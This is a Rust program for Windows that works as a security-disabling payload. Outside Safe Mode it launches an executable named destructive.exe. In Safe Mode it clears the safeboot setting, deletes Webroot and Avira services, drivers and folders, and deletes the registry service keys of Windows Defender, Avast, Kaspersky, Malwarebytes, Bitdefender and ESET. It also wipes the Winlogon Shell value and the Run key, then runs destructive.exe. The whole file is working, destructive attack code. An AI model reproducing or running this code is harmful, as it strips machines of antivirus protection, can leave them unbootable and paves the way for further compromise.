use std::process::{Command, Output};
use winreg::RegKey;
use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_WRITE};
use windows_sys::Win32::UI::WindowsAndMessaging::GetSystemMetrics;

// Check if the system is in Safe Mode
fn is_safe_mode() -> bool {
    unsafe {
        // 0x100 is the flag for checking if the system is in Safe Mode
        GetSystemMetrics(0x100) == 1
    }
}

// Run the command and capture the output
fn run_command(command: &str) -> std::io::Result<Output> {
    let output = Command::new("cmd")
        .args(&["/C", command])
        .output()?; // Executes the command and captures the output

    if !output.status.success() {
        // If the command fails, write the error output
        eprintln!(
            "Command failed: {}\nError: {}",
            command,
            String::from_utf8_lossy(&output.stderr)
        );
    }

    Ok(output)
}

// Function to delete a registry key or value
fn delete_registry_key(key_path: &str, value_name: Option<&str>) {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    match hklm.open_subkey_with_flags(key_path, KEY_WRITE) {
        Ok(subkey) => {
            if let Some(value) = value_name {
                // Delete the value
                match subkey.delete_value(value) {
                    Ok(_) => println!("Successfully deleted value: {}", value),
                    Err(e) => eprintln!("Failed to delete value: {}. Error: {}", value, e),
                }
            } else {
                // Delete the entire key (if no value name is provided)
                match hklm.delete_subkey_all(key_path) {
                    Ok(_) => println!("Successfully deleted key: {}", key_path),
                    Err(e) => eprintln!("Failed to delete key: {}. Error: {}", key_path, e),
                }
            }
        }
        Err(e) => {
            eprintln!("Failed to open registry key {}. Error: {}", key_path, e);
        }
    }
}

// Main function
fn main() {
    // Run destructive.exe at the start if Safe Mode is not enabled
    let destructive_command = r#"\"C:\Program Files\utkudrk2\destructive.exe\""#;
    
    if !is_safe_mode() {
        // If not in Safe Mode, run destructive.exe and exit
        match run_command(destructive_command) {
            Ok(output) => {
                // Print standard output if the command was successful
                println!("Executed: {}\nOutput: {}", destructive_command, String::from_utf8_lossy(&output.stdout));
            }
            Err(e) => eprintln!("Failed to execute {}: {}", destructive_command, e),
        }
        // Exit after running destructive.exe if not in Safe Mode
        return;
    }

    // If Safe Mode is enabled, continue with the other operations
    let commands = [
        r#"bcdedit /deletevalue {current} safeboot"#,
        r#"sc delete WRSkyClient"#,
        r#"sc delete WRCoreService"#,
        r#"sc delete WRSVC"#,
        r#"del /f /y "%SystemRoot%\System32\Drivers\wrkrn.sys""#,
        r#"del /f /y "%SystemRoot%\System32\wruser.dll""#,
        r#"rd /s /q "%ProgramFiles%\Webroot""#,
        r#"rd /s /q "%ProgramFiles(x86)%\Webroot""#,
        r#"rd /s /q "%ProgramData%\WRCore""#,
        r#"rd /s /q "%ProgramData%\WRData""#,
        r#"rd /s /q "%ProgramFiles%\Webroot""#,
        r#"rd /s /q "%ProgramFiles(x86)%\Webroot""#,
        r#"rd /s /q "%ProgramData%\WRCore""#,
        r#"rd /s /q "%ProgramFiles%\Avira""#,
        r#"rd /s /q "%ProgramFiles(x86)%\Avira""#,
        r#"rd /s /q "%ProgramData%\Avira""#,
    ];

    // Execute the commands one by one
    for command in commands.iter() {
        match run_command(command) {
            Ok(output) => {
                // Print standard output if the command was successful
                println!("Executed: {}\nOutput: {}", command, String::from_utf8_lossy(&output.stdout));
            }
            Err(e) => eprintln!("Failed to execute {}: {}", command, e),
        }
    }

    // Perform registry deletions after command execution
    delete_registry_key(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", Some("Shell"));
    delete_registry_key(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", None);
    delete_registry_key(r"SYSTEM\ControlSet001\Services\aswbIDSAgent", None);
    delete_registry_key(r"SYSTEM\ControlSet002\Services\aswbIDSAgent", None);
    delete_registry_key(r"SYSTEM\ControlSet001\Services\aswApPct", None);
    delete_registry_key(r"SYSTEM\ControlSet002\Services\aswApPct", None);
    delete_registry_key(r"SYSTEM\ControlSet001\Services\aswbidsdriver", None);
    delete_registry_key(r"SYSTEM\ControlSet002\Services\aswbidsdriver", None);
    delete_registry_key(r"SYSTEM\ControlSet001\Services\aswbidsh", None);
    delete_registry_key(r"SYSTEM\ControlSet002\Services\aswbidsh", None);
    delete_registry_key(r"SYSTEM\ControlSet001\Services\aswbuniv", None);
    delete_registry_key(r"SYSTEM\ControlSet002\Services\aswbuniv", None);
    delete_registry_key(r"SYSTEM\ControlSet001\Services\aswElam", None);
    delete_registry_key(r"SYSTEM\ControlSet002\Services\aswElam", None);
    delete_registry_key(r"SYSTEM\ControlSet001\Services\aswKbd", None);
    delete_registry_key(r"SYSTEM\ControlSet002\Services\aswKbd", None);
    delete_registry_key(r"SYSTEM\ControlSet001\Services\aswMonFit", None);
    delete_registry_key(r"SYSTEM\ControlSet002\Services\aswMonFit", None);
    delete_registry_key(r"SYSTEM\ControlSet001\Services\aswNetHub", None);
    delete_registry_key(r"SYSTEM\ControlSet002\Services\aswNetHub", None);
    delete_registry_key(r"SYSTEM\ControlSet001\Services\aswRdr", None);
    delete_registry_key(r"SYSTEM\ControlSet002\Services\aswRdr", None);
    delete_registry_key(r"SYSTEM\ControlSet001\Services\aswRvrt", None);
    delete_registry_key(r"SYSTEM\ControlSet002\Services\aswRvrt", None);
    delete_registry_key(r"SYSTEM\CurrentControlSet\Services\avast! Antivirus", None);
    delete_registry_key(r"SOFTWARE\WOW6432Node\Webroot", None);
    delete_registry_key(r"SOFTWARE\Microsoft\Windows\CurrentVersion\WRUNINST", None);
    delete_registry_key(r"SOFTWARE\WRData", None);
    delete_registry_key(r"SYSTEM\ControlSet001\services\WRSVC", None);
    delete_registry_key(r"SYSTEM\ControlSet002\services\WRSVC", None);
    delete_registry_key(r"SYSTEM\CurrentControlSet\services\WRSVC", None);
    delete_registry_key(r"SYSTEM\CurrentControlSet\Services\WinDefend", None);
    delete_registry_key(r"SYSTEM\ControlSet001\Services\WinDefend", None);
    delete_registry_key(r"SYSTEM\ControlSet002\Services\WinDefend", None);
    delete_registry_key(r"SYSTEM\CurrentControlSet\Services\AVP21.3", None);
    delete_registry_key(r"SYSTEM\ControlSet001\Services\AVP21.3", None);
    delete_registry_key(r"SYSTEM\ControlSet002\Services\AVP21.3", None);
    delete_registry_key(r"SYSTEM\CurrentControlSet\Services\MBAMService", None);
    delete_registry_key(r"SYSTEM\ControlSet001\Services\MBAMService", None);
    delete_registry_key(r"SYSTEM\ControlSet002\Services\MBAMService", None);
    delete_registry_key(r"SYSTEM\CurrentControlSet\Services\VSSERV", None);
    delete_registry_key(r"SYSTEM\ControlSet001\Services\VSSERV", None);
    delete_registry_key(r"SYSTEM\ControlSet002\Services\VSSERV", None);
    delete_registry_key(r"SYSTEM\CurrentControlSet\Services\eamonm", None);
    delete_registry_key(r"SYSTEM\CurrentControlSet\Services\edevmon", None);
    delete_registry_key(r"SYSTEM\CurrentControlSet\Services\ehdrv", None);
    delete_registry_key(r"SYSTEM\CurrentControlSet\Services\ekbdflt", None);
    delete_registry_key(r"SYSTEM\CurrentControlSet\Services\ekrn", None);
    delete_registry_key(r"SYSTEM\CurrentControlSet\Services\epfw", None);
    delete_registry_key(r"SYSTEM\CurrentControlSet\Services\epfwwfp", None);
    delete_registry_key(r"SYSTEM\CurrentControlSet\Services\ESETCleanersDriver", None);
    delete_registry_key(r"SOFTWARE\AVIRA", None);

    // Run destructive.exe at the end if Safe Mode is enabled
    match run_command(destructive_command) {
        Ok(output) => {
            // Print standard output if the command was successful
            println!("Executed: {}\nOutput: {}", destructive_command, String::from_utf8_lossy(&output.stdout));
        }
        Err(e) => eprintln!("Failed to execute {}: {}", destructive_command, e),
    }
}
